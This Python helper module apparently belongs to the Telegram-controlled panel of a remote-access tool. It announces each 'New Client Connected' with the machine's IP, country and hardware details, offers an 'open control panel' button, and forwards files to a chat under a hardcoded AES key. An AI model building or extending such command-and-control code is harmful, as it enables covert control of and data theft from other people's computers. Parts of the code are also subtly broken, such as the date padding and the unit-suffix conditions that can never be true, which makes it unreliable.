#-*- coding: utf-8 -*-

import pytz
from datetime import datetime
import datetime as dt
import requests
from AES import Crypt
import json
import unicodedata
from config import *
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
import aiofiles
import base64

AES_obj = Crypt("%Mq3t*&1T$C&F)JH")

class Color:
    clean        = "\033[0m"
    red          = "\033[91m"
    green        = "\033[92m"
    yellow       = "\033[93m"
    blue         = "\033[94m"
    purpule      = "\033[95m"
    cyan         = "\033[96m"

def colorize(color,text):
    return f"{color}{text}{Color.clean}"

def GetTime():
    tz = pytz.timezone('Asia/Tehran')
    full_time = datetime.now(tz)
    time_iran = full_time.strftime('%H:%M:%S')
    date = Jalali(full_time.strftime("%Y-%m-%d"))
    return colorize(Color.cyan,f"{date} {time_iran}")

def Jalali(timeframe):
    gy, gm, gd = timeframe.split("-")
    gy, gm, gd = int(gy), int(gm), int(gd)
    g_d_m = [0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334]
    if (gm > 2):
        gy2 = gy + 1
    else:
        gy2 = gy
    days = 355666 + (365 * gy) + ((gy2 + 3) // 4) - ((gy2 + 99) // 100) + ((gy2 + 399) // 400) + gd + g_d_m[gm - 1]
    jy = -1595 + (33 * (days // 12053))
    days %= 12053
    jy += 4 * (days // 1461)
    days %= 1461
    if (days > 365):
        jy += (days - 1) // 365
        days = (days - 1) % 365
    if (days < 186):
        jm = 1 + (days // 31)
        jd = 1 + (days % 31)
    else:
        jm = 7 + ((days - 186) // 30)
        jd = 1 + ((days - 186) % 30)

    jy, jm, jd = str(jy), str(jm), str(jd)
    if len(jm) == 1:
        jm = "0"+jm
    elif len(jd) == 1:
        jd = "0"+jm
    return f"{jy}-{jm}-{jd}"


def decode(text) -> dict:
    data_base64 = AES_obj.decrypt(text)
    return json.loads(data_base64)

def encode(json_data) -> str:
    data_base64 = AES_obj.encrypt(json.dumps(json_data,indent=4))
    return data_base64

def convert_to_fancy_text(text):
    fancy_text = ""
    for c in str(text):
        try:
            fancy_c = unicodedata.lookup("".join(["LATIN LETTER SMALL CAPITAL ", c.upper()]))
            fancy_text += fancy_c
        except KeyError:
            fancy_text += c
    return fancy_text
    

def get_flag(unicode):
    """
    Get the flag emoji for a given unicode string representing a country code.
    """
    OFFSET = 127397
    codepoints = [ord(char) + OFFSET for char in unicode.upper()]
    return chr(codepoints[0]) + ''.join([chr(c) for c in codepoints[1:]])

def connectFrame(ip,list_data):
    url = f"http://ip-api.com/json/{ip}"
    response = requests.get(url).json()

    if response["status"] == "success":
        country = convert_to_fancy_text(response["country"])+" "+get_flag(response['countryCode'])
        curr_time = dt.datetime.now()
        time_str = convert_to_fancy_text(curr_time.strftime("%Y-%m-%d %H:%M:%S"))
        topic = convert_to_fancy_text("New Client Connected") + "⚡️"
        # Get the length of the longest string
        ip = f"`{ip}`"
        longest_str_len = max(len(str(value)) for value in list_data.values())
        
        # Define the frame using the longest string length
        frame = f"┏{'━' * (longest_str_len - 18)}┓\n" \
                f"       {topic:<{longest_str_len + 4}}  \n" \
                f"       ɪᴘ: {ip:<{longest_str_len + 18}}  \n" \
                f"       ᴄᴏᴜɴᴛʀʏ: {country:<{longest_str_len +3}} \n" \
                f"       ᴛɪᴍᴇ: {time_str:<{longest_str_len}}  \n"
                
        for i,m in list_data.items():
            if i == "cpu_usage" and i == "ram_usage":
                m += "%"
            elif i == "ram_size" and i == "gpu_size" and i == "hard_full_size":
                m += "GB"

            i = convert_to_fancy_text(i.replace("_"," "))
            frame += f"       {i}: {convert_to_fancy_text(m):<{longest_str_len}}  \n"

        frame += f"┗{'━' * (longest_str_len - 18)}┛"
        return frame

    else:
        return "Error: Invalid IP Address"

def GetInfoFrame(ip,list_data):
    url = f"http://ip-api.com/json/{ip}"
    response = requests.get(url).json()

    if response["status"] == "success":
        country = convert_to_fancy_text(response["country"])
        curr_time = dt.datetime.now()
        time_str = convert_to_fancy_text(curr_time.strftime("%Y-%m-%d %H:%M:%S"))
        # Get the length of the longest string
        ip = f"`{ip}`"
        longest_str_len = max(len(str(value)) for value in list_data.values())
        
        # Define the frame using the longest string length
        frame = f"┏{'━' * (longest_str_len - 18)}┓\n" \
                f"       ɪᴘ: {ip:<{longest_str_len + 18}}  \n" \
                f"       ᴄᴏᴜɴᴛʀʏ: {country:<{longest_str_len +3}}  \n" \
                f"       ᴛɪᴍᴇ: {time_str:<{longest_str_len}}  \n"
                
        for i,m in list_data.items():
            if i == "cpu_usage" and i == "ram_usage":
                m += "%"
            elif i == "ram_size" and i == "gpu_size" and i == "hard_full_size":
                m += "GB"

            i = convert_to_fancy_text(i.replace("_"," "))
            frame += f"       {i}: {convert_to_fancy_text(m):<{longest_str_len}}  \n"

        frame += f"┗{'━' * (longest_str_len - 18)}┛"
        return frame

    else:
        return "Error: Invalid IP Address"

def send_message(chat_id, text,ip):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    headers = {'Content-type': 'application/json'}
    button = InlineKeyboardButton("ᴏᴘᴇɴ ᴄᴏɴᴛʀᴏʟ ᴘᴀɴᴇʟ", callback_data=f"tgip-{ip}")
    reply_markup = InlineKeyboardMarkup([[button]])
    data = json.dumps({'chat_id': chat_id, 'text': text , "parse_mode":"markdown" , "link_preview":False,"reply_markup": reply_markup.to_dict()})
    response = requests.post(url, headers=headers, data=data)
    return response.json()

def edit_message(text, chat_id, message_id,ip):
    url = f'https://api.telegram.org/bot{TOKEN}/editMessageText'
    
    # Create inline button
    button = InlineKeyboardButton("ʙᴀᴄᴋ", callback_data=f"tgip-{ip}")
    reply_markup = InlineKeyboardMarkup([[button]])
    
    # Add reply_markup to payload
    payload = {
        'chat_id': chat_id, 
        'message_id': message_id, 
        'text': text, 
        "parse_mode": "markdown", 
        "link_preview": False,
        "reply_markup": reply_markup.to_dict()
    }
    r = requests.post(url, json=payload)
    return r.json()

def read_json_db():
    raw_data = open("data.json",encoding="utf-8").read()
    data = json.loads(raw_data)
    return data

def write_json_db(data):
    open("data.json",'w',encoding="utf-8").write(json.dumps(data,indent=4))
    return True


def send_file(chat_id, file_path):
    url = f'https://api.telegram.org/bot{TOKEN}/sendDocument'

    with open(file_path, 'rb') as file:
        response = requests.post(url, data={'chat_id': chat_id}, files={'document': file})

    if response.status_code == 200:
        print('File sent successfully.')
    else:
        print(f'Failed to send file. Error code {response.status_code}: {response.text}')
    
